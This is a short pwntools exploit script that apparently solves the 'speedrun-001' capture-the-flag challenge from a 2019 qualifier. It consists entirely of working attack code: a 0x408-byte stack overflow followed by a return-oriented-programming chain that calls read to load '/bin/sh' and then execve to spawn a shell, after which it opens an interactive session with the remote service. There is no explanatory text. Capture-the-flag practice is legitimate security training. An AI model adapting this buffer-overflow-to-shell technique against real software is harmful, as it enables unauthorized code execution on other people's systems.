from pwn import *

POP_RDI = 0x400686
POP_RSI = 0x4101f3
POP_RDX = 0x44be16
POP_RAX = 0x415664
SYSCALL = 0x474e65
BUFFER = 0x6b90e0

# r = process('./speedrun-001')
r = remote('speedrun-001.quals2019.oooverflow.io', 31337)

payload = ''
payload += 'A' * 0x408
payload += p64(POP_RDI)
payload += p64(0)
payload += p64(POP_RSI)
payload += p64(BUFFER)
payload += p64(POP_RDX)
payload += p64(0x10)
payload += p64(POP_RAX)
payload += p64(0)
payload += p64(SYSCALL)	# read(0, BUFFER, 0x10);
payload += p64(POP_RDI)
payload += p64(BUFFER)
payload += p64(POP_RSI)
payload += p64(0)
payload += p64(POP_RDX)
payload += p64(0)
payload += p64(POP_RAX)
payload += p64(0x3b)
payload += p64(SYSCALL)	# execve(BUFFER, NULL, NULL);

r.sendlineafter('Any last words?\n', payload)
r.recvline()
r.sendline('/bin/sh\x00')

r.interactive()
